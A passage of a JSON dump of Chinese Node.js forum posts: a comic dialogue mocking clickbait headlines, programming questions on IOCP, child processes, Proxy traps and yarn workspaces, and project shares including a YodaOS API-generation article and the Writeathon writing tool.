\n<p>实习生小B：怎么可能不重要啊？北京的井盖儿都消失了还不算重要啊？这一天得造成多少次交通事故啊。（萌新脸）</p>\n<p>实习生小A：你是真傻还是装傻啊？看不出来文章标题是故意夸大啊。你要是点开看，它肯定说只是北京某处的井盖消失了，哪儿能是全北京城啊。我早就跟你说了，不要刷抖音，刷抖音降智，你不听。你看看你现在成什么样子了…（不屑脸）</p>\n<p>实习生小B：去你的吧。我还刷知乎，学习新姿势呢，你怎么不说？（不服脸）</p>\n<p>实习生小A：知乎？“与世界分享你刚编的段子”，那个知乎啊。（不屑脸）</p>\n<p>实习生小B：人家那是“与世界分享你身边的故事”。</p>\n<p>实习生小A：扯远了扯远了。接着说<strong>第二点要求：标题一定要简单粗暴</strong></p>\n<p>实习生小B：简单粗暴这个我会。不就是“说大白话”吗？是个人都会吧。</p>\n<p>实习生小A：是说“大白话”，也不是说“大白话”。</p>\n<p>实习生小B：那到底是不是“说大白话”啊？</p>\n<p>实习生小A：我也不知道。</p>\n<p>实习生小B：什么？你也不知道？那你还这么说！（生气脸）</p>\n<p>实习生小A：不是。这句话是那天咪老师说的。然后我也问她了，我说“咪老师，那到底是‘是’还是‘不是’啊？“</p>\n<p>实习生小B：咪老师怎么说？</p>\n<p>实习生小A：咪老师什么都没说，就直勾勾地瞪着我，足足有三分钟！然后说“第三点要求…”</p>\n<p>实习生小B：这…</p>\n<p>实习生小A：唉，实习生真不好做。（轻声叹息：早知道不休学了…）（苦逼脸）</p>\n<p>实习生小B：那第三个要求是啥？</p>\n<p>实习生小A：哦，<strong>第三点要求是：标题一定要颠覆常识</strong></p>\n<p>实习生小B：什么叫颠覆常识？</p>\n<p>实习生小A：给你举个例子：<strong>《他这么真诚，一定是在骗你！》</strong></p>\n<p>实习生小B：这是什么混蛋逻辑啊。真诚招你惹你了，就一定是骗子啊。（愤怒脸）</p>\n<p>实习生小A：别着急骂先。你看看它算不算是“颠覆常识”。</p>\n<p>实习生小B：… 还真算（尴尬脸）</p>\n<p>实习生小A：这就对了。读者看到这样的标题，肯定会觉得气。</p>\n<p>实习生小B：胡说八道，肯定气啊。</p>\n<p>实习生小A：只要一生气，那可就着了道了。鲁迅曾说：“你对待情绪的方式，决定了你生活的层次”（认真脸）</p>\n<p>实习生小B：鲁迅说过这话？（好奇脸）</p>\n<p>实习生小A：说过啊，不信你去Google！（严肃脸）</p>\n<p>实习生小B：Google上不去，算了，信你一回。（悻悻脸）</p>\n<p>实习生小A：三点建议呢，就是这样。晚上下班到家后，我饭也顾不上吃，就想啊。最后绞尽脑汁地想了一宿，才想出来个我觉得完全符合咪老师要求的标题。然后第二天一大早就来到老师办公室，把标题交了上去。（疲惫脸）</p>\n<p>实习生小B：然后呢？</p>\n<p>实习生小A：然后？然后我被辞了。</p>\n<p>实习生小B：被…被辞了？就因为这件破事儿？（震惊脸）</p>\n<p>实习生小A：嗯。</p>\n<p>实习生小B：那你交上去的是啥标题啊？</p>\n<p>实习生小A：<strong>《一夜之间，寒门出身的状元周有择死了，一定是在骗你！》</strong></p>\n</div>","title":"写了段相声：一个休学的实习生的被裁经历（为了吐槽今早朋友圈被刷屏的咪蒙文章《一个出身寒门的状元之死》）","last_reply_at":"2019-03-24T14:19:53.669Z","good":false,"top":false,"reply_count":4,"visit_count":1799,"create_at":"2019-01-30T09:08:37.014Z","author":{"loginname":"shuiRong","avatar_url":"https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"}},{"id":"5c95aacefd41137eb7660b3d","author_id":"5c862e877ce0df3732426edf","tab":"ask","content":"<div class=\"markdown-text\"><p>post,put方法传的数组和对象都需要是真实的数组和对象，全部是传的字符串，这样会遇到不少潜在问题。会有什么问题？</p>\n</div>","title":"post,put方法传的数组和对象都需要是真实的数组和对象，全部是传的字符串，这样会遇到不少潜在问题。会有什么问题？","last_reply_at":"2019-03-24T09:06:45.857Z","good":false,"top":false,"reply_count":7,"visit_count":560,"create_at":"2019-03-23T03:41:02.427Z","author":{"loginname":"cheerApril","avatar_url":"https://avatars0.githubusercontent.com/u/38412944?v=4&s=120"}},{"id":"5c9512e4fd41137eb7660a6a","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>typedef struct\n{\n    OVERLAPPED Overlapped;\n    WSABUF DataBuf;\n    CHAR Buffer[DATA_BUFSIZE];\n    DWORD BytesSEND;\n\tDWORD BytesRECV;\n    int OperationType;\n\n} PER_IO_OPERATION_DATA, * LPPER_IO_OPERATION_DATA;\n\n\n</code></pre><p>发送和接收共用一个 DataBuf  也就是正在接收数据的时候不能发送，正在发送的时候也不能接收\n这样理解对吗？</p>\n</div>","title":"iocp是发送和接收共用一个缓冲区吗？","last_reply_at":"2019-03-24T08:44:17.411Z","good":false,"top":false,"reply_count":6,"visit_count":409,"create_at":"2019-03-22T16:52:52.053Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c948aabfd41137eb76607eb","author_id":"4efc278525fa69ac69000141","tab":"ask","content":"<div class=\"markdown-text\"><p>文档上没有看到明确说, <code>proc.kill</code> 的默认行为怎么理解?\n我遇到的是在工具当中通过 <code>child_process</code> 启动了子进程, 比如 webpack, 但是 webpack 运行的时候又有它的子进程… 结果我在 kill Webpack 的时候子进程就变成 orphan 了.  想知道 <code>proc.kill</code>  的默认行为是不是存在坑.</p>\n</div>","title":"proc.kill 的默认行为如何理解?","last_reply_at":"2019-03-24T07:50:23.577Z","good":false,"top":false,"reply_count":11,"visit_count":441,"create_at":"2019-03-22T07:11:39.718Z","author":{"loginname":"jiyinyiyong","avatar_url":"https://avatars0.githubusercontent.com/u/449224?v=4&s=120"}},{"id":"5c971cc400bcfd7eb2be56e4","author_id":"5ad94f6c464b1bfa6b425794","tab":"ask","content":"<div class=\"markdown-text\"><p>除了 lerna , oao 以外 還有沒有什麼其他的 適合用在 yarn workspaces 的管理系統?</p>\n<p>這兩個在大部分情況下 都不適合我的使用環境與習慣</p>\n<p>例如 (以下為我不想要的狀況)</p>\n<ol>\n<li>發布時 會將 沒有加入 git 的模組也一起發布</li>\n<li>發布時 無法排除 私人模組 與 未完成的模組</li>\n<li>會強制 publish 一次版本變化(當部分模組在使用 lerna 以前就已經 發布過 並且 沒有更動的狀況下)</li>\n<li>不允許ˋ包含其他 git 倉庫</li>\n</ol>\n<p>這些問題 對我來說還挺困擾的</p>\n<p>所以想問問有沒有 其他的類似模組可以使用\n如果沒有的話 只好自己弄一套了</p>\n</div>","title":"除了 lerna , oao 以外 還有沒有什麼其他的 適合用在 yarn workspaces 的管理系統?","last_reply_at":"2019-03-24T05:59:32.112Z","good":false,"top":false,"reply_count":0,"visit_count":518,"create_at":"2019-03-24T05:59:32.112Z","author":{"loginname":"bluelovers","avatar_url":"https://avatars0.githubusercontent.com/u/167966?v=4&s=120"}},{"id":"5c95fcff00bcfd7eb2be5474","author_id":"5b95e609f1e8bc7579c783c8","tab":"ask","content":"<div class=\"markdown-text\"><p>如下代码</p>\n<pre class=\"prettyprint language-javascript\"><code>function Test() {\n}\n\nconst a = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Array.prototype;\n\t}\n});\n\nconsole.log(a instanceof Array); &#x2F;&#x2F; true\n\nconst b = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Test.prototype;\n\t}\n});\n\nconsole.log(b instanceof Test); &#x2F;&#x2F; false\nconsole.log(b instanceof Test); &#x2F;&#x2F; true\nconsole.log(b instanceof Test); &#x2F;&#x2F; true\n</code></pre><p>为什么 a, b 两个的结果完全不一样, 原生类和我自己定义的类难道有什么区别?</p>\n<p>而对于后面两个结果, 难道 getPrototypeOf 存在副作用?</p>\n<p>另一个例子如下</p>\n<pre class=\"prettyprint language-javascript\"><code>class Test {}\n\nconst a = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Array.prototype;\n\t}\n});\n\nconsole.log(a instanceof Array); &#x2F;&#x2F; true\n\nconst b = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Test.prototype;\n\t}\n});\n\nconsole.log(b instanceof Test); &#x2F;&#x2F; true\nconsole.log(b instanceof Test); &#x2F;&#x2F; true\nconsole.log(b instanceof Test); &#x2F;&#x2F; true\n</code></pre><p>如果把函数换成 class, 则出现了预期之中的结果, 但是 js 中 class 不是仅仅是语法糖吗? 为什么会有这样的区别?</p>\n<p>补充环境</p>\n<p>Node v10.15.1 64bit 和 Chrome 73.0.3683.86 复现</p>\n<p>FF 66.0.1 64bit 则全都是 true, 符合预期</p>\n<p>再补充下, 使用 <code>Object.getPrototypeOf()</code> 则结果都符合预期, 出问题的只有 <code>instanceof</code></p>\n<pre class=\"prettyprint language-javascript\"><code>function Test() {\n}\n\nconst a = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Array.prototype;\n\t}\n});\n\nconsole.log(Object.getPrototypeOf(a) === Array.prototype); &#x2F;&#x2F; true\n\nconst b = new Proxy({}, {\n\tgetPrototypeOf() {\n\t\treturn Test.prototype;\n\t}\n});\nconsole.log(Object.getPrototypeOf(b) === Test.prototype); &#x2F;&#x2F; true\nconsole.log(Object.getPrototypeOf(b) === Test.prototype); &#x2F;&#x2F; true\nconsole.log(Object.getPrototypeOf(b) === Test.prototype); &#x2F;&#x2F; true\n</code></pre></div>","title":"ES6 中 Proxy 的 getPrototypeOf 陷阱是怎么回事?","last_reply_at":"2019-03-23T19:54:29.320Z","good":false,"top":false,"reply_count":2,"visit_count":411,"create_at":"2019-03-23T09:31:43.800Z","author":{"loginname":"ta7sudan","avatar_url":"https://avatars1.githubusercontent.com/u/34350871?v=4&s=120"}},{"id":"5c96358bfd41137eb7660d32","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://blog.t9t.io/tomato-pie-2.0-2019-03-23/\">https://blog.t9t.io/tomato-pie-2.0-2019-03-23/</a></p>\n</div>","title":"番茄工作法的一种新的 UI 尝试 tomato-pie 发布 2.0 版，以及产品发布一个月以来的一些数据分享","last_reply_at":"2019-03-23T13:32:59.771Z","good":false,"top":false,"reply_count":0,"visit_count":611,"create_at":"2019-03-23T13:32:59.771Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5c960f3600bcfd7eb2be54d3","author_id":"583fbf5b27d001d606ac1b2d","tab":"share","content":"<div class=\"markdown-text\"><p>分享 Nodejs  egg框架 开发的，微信支付sdk，包含demo。提供参考：\ngit地址：<a href=\"https://github.com/iteming/egg-wxpay.git\">https://github.com/iteming/egg-wxpay.git</a></p>\n<p><img src=\"//static.cnodejs.org/Fh9kAmRf46L9pxY0MGJbU3HBwnCS\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/Fm4SUVdvrk5dxaKKz0YUU8YAx893\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FncWHgNQChMKPZ2bDMSsEAHFtRHI\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FnvEaRtFYiAA90MVv3Hs6JMR-kF6\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FnziqlJMeS1uj4Amb9FuW-KSv3xT\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FoG9f5YZekAaYv8C4bItOzPT_RwX\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FoWxEyp2iX-eU5_MWS1UTlwCPtCB\" alt=\"image.png\"></p>\n<p>如有好的意见建议，或者需要完善此demo，可发邮件给我！\nEmail: <a href=\"mailto:coolon@126.com\">coolon@126.com</a></p>\n</div>","title":"原创：分享 Nodejs  egg框架 开发的，微信支付sdk，包含demo","last_reply_at":"2019-03-23T10:49:26.656Z","good":false,"top":false,"reply_count":0,"visit_count":420,"create_at":"2019-03-23T10:49:26.656Z","author":{"loginname":"iteming","avatar_url":"https://avatars1.githubusercontent.com/u/8397706?v=4&s=120"}},{"id":"5c96026400bcfd7eb2be5493","author_id":"52c005d28a716e0b1578f9cc","tab":"share","content":"<div class=\"markdown-text\"><p>在 Node.js 社区中，其实不乏通过 Markdown 生成 RESTful API 的框架，按照一定的格式约定好 API 所需要的数据，然后再通过解析 Markdown 文档，将这些关键数据提取出来，最后生成数据库模型和 HTTPS 服务。</p>\n<p>YodaOS 作为一个前端操作系统，同样使用了类似的技术。YodaOS 中的应用分为：lightapp 和 extapp，前者是集成在语音交互运行时（Vui-daemon）进程内部的轻应用，它主要是用于一个交互简单，需要快速响应的场景，比如音量控制、系统控制等。后者作为一个独立的进程，通过 Child Process 与主进程通讯，使用场景主要是音乐、游戏、电话等需要长时期使用的应用。</p>\n<blockquote>\n<p><strong>为什么要有轻应用？</strong> 轻应用更像是一个脚本，每当用户一次进行一次交互，只需要从预先加载的脚本中调用定义在对应脚本的函数即可完成一次响应，往往这类应用交互比较简单，如果为此要创建在每次交互的过程中进行一次 ipc 甚至 fork 时，无论对性能还是内存来说，都是比较浪费的。</p>\n</blockquote>\n<p>在设计之初，我们期望对于开发者来说，并不需要针对不同类型的应用，只需要在 package.json 中修改类型即可，YodaOS API 应当保持完全一致。这样的话，我们则面对一个问题，即使是能做到高度抽象，也需要在每次新增一个接口时，修改两处代码，这其实是有违我们的设计初衷的。</p>\n<h3>API Descriptor</h3>\n<p>为此，我们引入了 API Descriptor 的概念：<a href=\"https://github.com/yodaos-project/yodart/blob/master/runtime/lib/descriptor/activity-descriptor.js%E3%80%82%E5%8F%AF%E4%BB%A5%E6%8A%8A%E5%AE%83%E7%9C%8B%E4%BD%9C%E6%98%AF%E7%94%A8\">https://github.com/yodaos-project/yodart/blob/master/runtime/lib/descriptor/activity-descriptor.js。可以把它看作是用</a> JavaScript 写的 DSL，它用于描述每个 YodaOS API，包括命名空间、事件、方法等定义。系统在初始化时，会加载所有 API Descriptor，然后分别在 lightapp 和 extapp 生成对应的 API。</p>\n<pre class=\"prettyprint language-js\"><code>Object.assign(ActivityDescriptor.prototype,\n  {\n    &#x2F;**\n     * When the app is active.\n     * @event yodaRT.activity.Activity#active\n     *&#x2F;\n    active: {\n      type: &#x27;event&#x27;\n    },\n    &#x2F;**\n     * When the Activity API is ready.\n     * @event yodaRT.activity.Activity#ready\n     *&#x2F;\n    ready: {\n      type: &#x27;event&#x27;\n    },\n    &#x2F;**\n     * When an activity is created.\n     * @event yodaRT.activity.Activity#create\n     *&#x2F;\n    created: {\n      type: &#x27;event&#x27;\n    }\n  }\n)\n</code></pre><p>上面的代码分别定义了 Activity 中的几个事件：<code>active</code>、<code>ready</code> 和 <code>create</code>。因此，在任何应用中都可以这样写：</p>\n<pre class=\"prettyprint language-js\"><code>module.exports = activity =&gt; {\n  activity.on(&#x27;active&#x27;, () =&gt; console.log(&#x27;app activated&#x27;))\n  activity.on(&#x27;ready&#x27;, () =&gt; console.log(&#x27;app is ready&#x27;))\n  activity.on(&#x27;created&#x27;, () =&gt; console.log(&#x27;app is created&#x27;))\n}\n</code></pre><p>接下来我们再看看“方法”是如何定义：</p>\n<pre class=\"prettyprint language-js\"><code>Object.assign(ActivityDescriptor.prototype,\n  {\n    &#x2F;**\n     * Get all properties, it contains the following fields:\n     * - &#96;deviceId&#96; the device id.\n     * - &#96;deviceTypeId&#96; the device type id.\n     * - &#96;key&#96; the cloud key.\n     * - &#96;secret&#96; the cloud secret.\n     * - &#96;masterId&#96; the userId or masterId.\n     *\n     * @memberof yodaRT.activity.Activity\n     * @instance\n     * @function get\n     * @returns {Promise&lt;object&gt;}\n     * @example\n     * module.exports = function (activity) {\n     *   activity.on(&#x27;ready&#x27;, () =&gt; {\n     *     activity.get().then((props) =&gt; console.log(props))\n     *   })\n     * }\n     *&#x2F;\n    get: {\n      type: &#x27;method&#x27;,\n      returns: &#x27;promise&#x27;,\n      fn: function get () {\n        return Promise.resolve(this._runtime.getCopyOfCredential())\n      }\n    },\n  }\n)\n</code></pre><p>可以看到，与定义事件的方式一样，只需要在 Descriptor 的原型链中，增加对应的对象，然后设置类型（type）为 method 即可，然后在 fn 中实现函数。</p>\n<pre class=\"prettyprint language-js\"><code>module.exports = activity =&gt; {\n  activity.get().then(\n    (data) =&gt; console.log(&#x27;credentialse is&#x27;, data),\n    (err) =&gt; console.error(&#x27;something went wrong&#x27;, err))\n}\n</code></pre><p>这样除了 API 定义可以统一起来了，也能比较方便地基于 JSDoc 生成统一的 API Reference 给开发者，使得整个 API 的修改能做到简单易读、门槛低和修改成本低等。</p>\n<h3>API Translator</h3>\n<p>那么在 YodaOS 中，又是如何将上述的 Descriptor 生成为开发者直接使用的接口的呢？下面就为大家介绍我们引入的 Translator。</p>\n<p>Translator 是按照我们支持的应用类型对应的，因此对于 lightapp 和 extapp 来说，我们也分为两个 translator：</p>\n<ul>\n<li>进程内的 <a href=\"https://github.com/yodaos-project/yodart/blob/master/runtime/client/translator-in-process.js\">https://github.com/yodaos-project/yodart/blob/master/runtime/client/translator-in-process.js</a></li>\n<li>进程间的 <a href=\"https://github.com/yodaos-project/yodart/blob/master/runtime/client/translator-ipc.js\">https://github.com/yodaos-project/yodart/blob/master/runtime/client/translator-ipc.js</a></li>\n</ul>\n<p>本文并不具体展开每个 translator 的工作原理，但会做一些简单的流程介绍。以 translator-ipc 为例：</p>\n<pre class=\"prettyprint language-js\"><code>module.exports.translate = translate\nfunction translate (descriptor) {\n  if (typeof process.send !== &#x27;function&#x27;) {\n    throw new Error(&#x27;IpcTranslator must work in child process.&#x27;)\n  }\n  var activity = PropertyDescriptions.namespace(null, descriptor, null, null)\n  listenIpc()\n  return activity\n}\n</code></pre><p>每个 translator 提供一个函数，即 <code>translate(descriptor)</code>。它接受一个 descriptor 对象，然后会遍历原型链中的对象，并且分别按照 namespace、event 和 method 去生成一个叫 activity 的对象，最后将这个对象返回给开发者。</p>\n<p>当开发者在使用某个 API 时，activity 对象会按照 translator 预先生成（约定）好的逻辑调用到服务端（Vui-daemon），最后再通过 Promise 返回调用后的结果，从而完成一次接口调用。</p>\n<h3>后记</h3>\n<p>本文简单介绍了 YodaOS 在 API 设计过程中，如何利用 DSL，解决 YodaOS API 在多种应用形态保持一致性。以此，我们希望抛砖引玉：</p>\n<ul>\n<li>帮助读者更好地了解 YodaOS API 的生成过程</li>\n<li>帮助读者了解到 DSL，也能将这种思路应用在自己的项目中</li>\n</ul>\n<p>如有更多问题，欢迎评论，或者直接在 GitHub 上给我们提问题：<a href=\"https://github.com/yodaos-project/yodart/issues/new/choose\">https://github.com/yodaos-project/yodart/issues/new/choose</a></p>\n<h3>参考</h3>\n<ul>\n<li>D-Bus introspection：<a href=\"https://www.gnu.org/software/emacs/manual/html_node/dbus/Introspection.html\">https://www.gnu.org/software/emacs/manual/html_node/dbus/Introspection.html</a></li>\n<li>YodaOS：<a href=\"https://github.com/yodaos-project\">https://github.com/yodaos-project</a></li>\n</ul>\n</div>","title":"YodaOS 中是如何生成 API 的","last_reply_at":"2019-03-23T09:54:44.065Z","good":false,"top":false,"reply_count":0,"visit_count":369,"create_at":"2019-03-23T09:54:44.065Z","author":{"loginname":"yorkie","avatar_url":"https://avatars3.githubusercontent.com/u/1935767?v=4&s=120"}},{"id":"5c94d102fd41137eb76609b7","author_id":"5c94ccaffd41137eb766099b","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://www.writeathon.cn\"><strong>Writeathon</strong></a>是一款为写作而设计、为写作而开发的工具，基于极简理念，提供简洁、高效、专注的写作体验。主要亮点：</p>\n<ul>\n<li><strong>沉浸式体验</strong> ：极简设计，聚焦写作区域；</li>\n<li><strong>实用功能</strong> ：<a href=\"https://github.github.com/gfm\">GFM</a>语法、Zen模式、分栏模式 、夜间模式、语法提示/格式工具、图床、内容快照…提升效率，享受写作乐趣；</li>\n<li><strong>写作辅助</strong> ：内置思维导图Zenminder、写作统计和写作目标设置，辅助文章构思，随时掌握写作进度。</li>\n</ul>\n<h2>设计</h2>\n<p>主界面将写作区域最大化，其余功能区安排在窗口四角，最大限度减少干扰。</p>\n<p>整体设计采用黑白灰三色，配合简洁的动效，带来清爽、轻便的体验。</p>\n<p><img src=\"//static.cnodejs.org/Fl6Z66CVrh6pIxXIsBdHQ7YFNXbu\" alt=\"ui.png\"></p>\n<h2>写作统计</h2>\n<p>提供故事、文章和字数总计，提供写作日历，更直观地查看写作进度，提供按月度的字数统计，可以随时掌握写作习惯。</p>\n<p><img src=\"//static.cnodejs.org/Foiu_OZwdPwBcUJZyU8litOJfsZY\" alt=\"stats-zh.png\"></p>\n<h2>个人主页</h2>\n<p>可设置个人主页，将文章发布到个人主页中。</p>\n<p><img src=\"//static.cnodejs.org/Fsy-yv4HvsRTpaxh_XQwoFAvchlX\" alt=\"profile.png\"></p>\n<h2>编辑器</h2>\n<p>内置编辑器除了支持标准的Markdown语法，如<strong>加粗</strong>、<em>斜体</em>外，还支持由Github提出的<a href=\"https://github.github.com/gfm\">GFM</a>语法，其增加了<strong>删除线</strong>、<strong>代码块</strong>、<strong>语法高亮</strong>、<strong>表格</strong>，此外还基于<a href=\"https://katex.org/\">Katex</a>实现对<a href=\"https://zh.wikipedia.org/wiki/TeX\">Tex</a>数学公式的支持。</p>\n<p>同时提供<strong>Excel/Word表格复制</strong>、<strong>自增列表</strong>、<strong>自动补全括号</strong>、<strong>高亮匹配括号</strong>、<strong>折叠代码/链接</strong>、<strong>智能标点</strong>等增强功能。</p>\n<h3>Zenminder</h3>\n<p><strong>Zenminder</strong>是一个专门为写作设计的思维导图工具，提供主题节点布局（多层级）、自由节点布局、自由节点连接、多行文本节点等功能，可以作为提纲、人物、情节和文章结构的构思工具。</p>\n<p>同时提供双栏模式，可一边查看导图一边写作。亦可将主题节点结构插入到文章中，然后展开写作。</p>\n<blockquote>\n<p>**提示：**Zenminder请在最新的Chrome浏览器中使用。</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/Fk9UHYkslCgOz210lR7NvC_e6Tzc\" alt=\"zenminder.png\"></p>\n<h3>Zen模式</h3>\n<p><strong>Zen模式</strong>整合了全屏和打字机效果，进入该模式，编辑器的高度将会固定为屏幕的一半，同时高亮当前编辑行，将视觉焦点始终保持在屏幕的中部。</p>\n<p><img src=\"//static.cnodejs.org/FuofKmNZMrsqYGN_uMZov609DoIf\" alt=\"zenmode.png\"></p>\n<h3>内容快照</h3>\n<p>系统会根据文章自动保存间隔进行备份，与一般自动备份不同的是，还可以直观地查看历史文章的内容。</p>\n<blockquote>\n<p>**提示：**文章自动保存间隔可在设置中调整，目前支持1、5、10分钟。</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/FirrvBTq3PnUHeQk0H8bbauvLrwr\" alt=\"page_snapshot.png\"></p>\n<h3>分栏模式</h3>\n<p><strong>分栏模式</strong>同时显示写作和预览区域，能够实时预览Markdown文档渲染结果。</p>\n<p><img src=\"//static.cnodejs.org/Fud55i1jML7d3NdqI4iH3Zji-95-\" alt=\"splitmode.png\"></p>\n<h3>夜间模式</h3>\n<p>编辑器、Zenminder均支持夜间模式，该模式下的字体、按钮颜色均有相应的优化。</p>\n<blockquote>\n<p>**提示：**目前夜间模式仅支持编辑器范围，后续版本会实现全局夜间模式。</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/FptqN_4kciyCeHYXmjrEFWgC3qu_\" alt=\"nightmode.png\"></p>\n<h3>语法提示/格式工具</h3>\n<p>通过输入‘@’可获取Markdown语法提示，同时选中文字会出现格式工具栏，目前提供加粗、斜体、删除、引用、有序列表、无序列表和待办列表等操作。</p>\n<p><img src=\"//static.cnodejs.org/Fmnbhmte8tx6bQK5kKU4FhMUu6Bm\" alt=\"hint.png\"></p>\n<h3>实时目录</h3>\n<p>根据Markdown语法中的标题，可生成最多四级目录，目录可以在预览和分享模式中切换显示并进行页内导航。</p>\n<p><img src=\"//static.cnodejs.org/FoOYXbLPGJYTcjX44WpmkjP7rkq4\" alt=\"toc.png\"></p>\n<h3>语法纠错</h3>\n<p>基于<a href=\"https://ai.baidu.com/tech/nlp/text_corrector\">百度AI</a>的文章纠错接口提供<strong>中文纠错</strong>功能，开启后可对错别字词进行替换操作。</p>\n<p><img src=\"//static.cnodejs.org/Ft0sxllkt1mD7GmyCucCTyuDb-2w\" alt=\"lexicalcheck.png\"></p>\n<h3>图床</h3>\n<p>支持上传本地图片到图床。</p>\n<blockquote>\n<p>此为实验性功能，当前仅支持<a href=\"https://sm.ms/\">SM.MS</a>，后续会整合更多图床。</p>\n</blockquote>\n<h3>音效</h3>\n<p>精心收集了<strong>按键</strong>、<strong>回车</strong>和<strong>空格</strong>按键音效，以及<strong>雨</strong>、<strong>大海</strong>、<strong>溪流</strong>等白噪音，增加写作乐趣。</p>\n<h3>分享</h3>\n<p>可以开启文章分享功能，可设置分享密码，通过链接和二维码在Web（包括移动端）中分享。</p>\n<h3>写作目标</h3>\n<p>可以设定字数和时间目标，倒计时达到一半和结束均会提示。</p>\n<h3>导出</h3>\n<p>目前支持导出markdown、pdf和html格式的文档，后续会逐步支持epub、word等格式。</p>\n<h3>移动端适配</h3>\n<p>移动端Web能够查看分享的文章，并进行简单的目录、文章编辑等操作。</p>\n<h3>其它功能</h3>\n<p>包括：<strong>文章移动</strong>、<strong>文章排序</strong>、<strong>简单搜索</strong>、<strong>还原已删除文章</strong>、<strong>最近打开的文章</strong>。</p>\n<h2>产品计划</h2>\n<p>未来，在继续增强写作体验的基础上，会在写作灵感、写作辅助、写作训练等方面进行探索，<strong>Writeathon</strong>的目标不仅是一款好用的工具，更希望能帮助用户创作出更多激动人心的作品。</p>\n<h2>意见反馈</h2>\n<p>反馈社区：<a href=\"https://support.qq.com/products/45320\">吐个槽</a>\nQQ群：972622254\n邮箱：<a href=\"mailto:690090@qq.com\">690090@qq.com</a>\n微博：<a href=\"http://weibo.com/writeathon\">writeathon</a>\n微信公众号：writeathon\n<img src=\"//static.cnodejs.org/FtOinadN0dObZ1GNmXZpktIOlA_2\" alt=\"wechat_writeathon_qrcode.jpg\"></p>\n</div>","title":"【Writeathon】-极简、高效的写作平台（基于Eggjs+Nuxt+Bulma实现）","last_reply_at":"2019-03-22T12:13:55.017Z","good":false,"top":false,"reply_count":1,"visit_count":500,"create_at":"2019-03-22T12:11:46.983Z","author":{"loginname":"Hcs66","avatar_url":"https://avatars2.githubusercontent.com/u/255027?v=4&s=120"}},{"id":"5c94d050fd41137eb76609af","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><p>全职写开源代码，建立 reputation 的同时获得报酬，是程序员梦想的工作吗？</p>\n<blockquote>\n<p><a href=\"https://github.com/t9tio/open-source-jobs\">https://github.com/t9tio/open-source-jobs</a></p>\n</blockquote>\n<p><a href=\"https://github.com/t9tio/open-source-jobs\"><img src=\"https://raw.githubusercontent.com/timqian/images/master/Screen%20Shot%202019-03-22%20at%207.57.11%20PM.png\" alt></a></p>\n</div>","title":"茶余饭后收集了一张提供工作机会的开源项目的列表，欢迎一起作为 markdown 工程师来改进它","last_reply_at":"2019-03-22T12:08:48.256Z","good":false,"top":false,"reply_count":0,"visit_count":548,"create_at":"2019-03-22T12:08:48.256Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5c87a30dacb681372d41776c","author_id":"58898ca65d4612c33919ea01","tab":"share","content":"<div class=\"markdown-text\"><h2>需求</h2>\n<p><img src=\"//static.cnodejs.org/Fs7iMBX7K-g0RAUPA_FIHBdyhP7l\" alt=\"requirement.jpg\"></p>\n<p>源库中的数据是以<code>BLOB</code>的形式存储的，且数据中含有中文，MySQL数据库的字符集为<code>utf8</code>，最终想要的效果就是在浏览器中以文本的形式展示源库中的数据。为了实现这一需求，尝试了2种方案：</p>\n<ul>\n<li>从Oracle层面解决，通过视图将相关字段转换成<code>VARCHAR2</code>类型后在返回，这样从Oracle中查询数据的时候，直接拿到的就是字符串类型的数据。这样做的弊端是：Oracle数据库VARCHAR2类型最大只能支持4kb，如果超过了这个大小就会出错。</li>\n<li>从Oracle取到数据后，使用Node.js转换成字符串后再存入到MySQL数据库中。</li>\n</ul>\n<p>我使用了第2种解决方案，但是过程并不是很顺利。</p>\n<h2>遇到的问题</h2>\n<p>从Oracle数据库中取到的数据，在Node.js中是<code>Buffer</code>对象，要将Buffer对象转换成字符串对Node.js来说实在是太常规了，直接<code>buffer.toString</code>就完事了，可事实并非如此，得到的字符串都是乱码。一般遇到这个问题，大家的第一反应肯定是编码问题，我也是这么想的，考虑到数据中有中文，而Node.js原生并没有支持中文的相关编码，默认是<code>utf8</code>，已经尝试过了。所以就引入了<a href=\"https://github.com/ashtuchkin/iconv-lite\">iconv-lite</a>这个模块，用来对Buffer对象进行解码，但是Oracle中使用的字符集是<code>SIMPLIFIED CHINESE_CHINA.ZHS32GB18030</code>，所以我想当然的就使用<code>GB18030</code>编码来解码，代码示例：</p>\n<pre class=\"prettyprint language-js\"><code>const iconv = require(&#x27;iconv-lite&#x27;);\n\n&#x2F;&#x2F; Convert from an encoded buffer to js string.\nconst str = iconv.decode(buffer, &#x27;gb18030&#x27;);\n</code></pre><p>结果得到的字符串还是乱码，然后我又把iconv-lite支持的所有中文编码又试了一遍，得到的字符串全都是乱码。</p>\n<h2>解决</h2>\n<p>经过一番Google和尝试后仍然没有解决，然后就在上述提到的两种方案之间来回折腾。后来在朋友的引导下，得到了一个思路：先探测Buffer对象的编码，得到确定的编码后，再进行解码。于是乎就找到了这个模块：<a href=\"https://github.com/sonicdoe/detect-character-encoding\">detect-character-encoding</a>。这个模块主要是用来探测字符编码的，使用方法也很简单，示例代码：</p>\n<pre class=\"prettyprint language-js\"><code>const fs = require(&#x27;fs&#x27;);\nconst detectCharacterEncoding = 